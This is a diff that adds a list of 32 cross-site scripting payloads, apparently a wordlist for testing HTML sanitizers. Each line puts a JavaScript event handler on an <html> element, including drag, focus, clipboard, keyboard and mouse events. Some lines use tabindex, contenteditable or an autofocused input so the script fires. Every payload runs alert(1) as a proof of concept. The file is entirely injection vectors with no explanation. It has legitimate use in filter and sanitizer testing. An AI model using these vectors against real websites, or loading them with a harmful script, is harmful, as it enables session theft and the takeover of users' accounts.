@@ -1,0 +1,32 @@
+<html draggable="true" ondrag="alert(1)">test</html>
+<html draggable="true" ondragend="alert(1)">test</html>
+<html draggable="true" ondragenter="alert(1)">test</html>
+<html draggable="true" ondragleave="alert(1)">test</html>
+<html draggable="true" ondragstart="alert(1)">test</html>
+<html id=x tabindex=1 onactivate=alert(1)></html>
+<html id=x tabindex=1 onbeforeactivate=alert(1)></html>
+<html id=x tabindex=1 onbeforedeactivate=alert(1)></html><input autofocus>
+<html id=x tabindex=1 ondeactivate=alert(1)></html><input id=y autofocus>
+<html id=x tabindex=1 onfocus=alert(1)></html>
+<html id=x tabindex=1 onfocusin=alert(1)></html>
+<html onbeforecopy="alert(1)" contenteditable>test</html>
+<html onbeforecut="alert(1)" contenteditable>test</html>
+<html onbeforepaste="alert(1)" contenteditable>test</html>
+<html onblur=alert(1) tabindex=1 id=x></html><input autofocus>
+<html onclick="alert(1)">test</html>
+<html oncontextmenu="alert(1)">test</html>
+<html oncopy="alert(1)" contenteditable>test</html>
+<html oncut="alert(1)" contenteditable>test</html>
+<html ondblclick="alert(1)">test</html>
+<html onfocusout=alert(1) tabindex=1 id=x></html><input autofocus>
+<html onkeydown="alert(1)" contenteditable>test</html>
+<html onkeypress="alert(1)" contenteditable>test</html>
+<html onkeyup="alert(1)" contenteditable>test</html>
+<html onmousedown="alert(1)">test</html>
+<html onmouseenter="alert(1)">test</html>
+<html onmouseleave="alert(1)">test</html>
+<html onmousemove="alert(1)">test</html>
+<html onmouseout="alert(1)">test</html>
+<html onmouseover="alert(1)">test</html>
+<html onmouseup="alert(1)">test</html>
+<html onpaste="alert(1)" contenteditable>test</html>
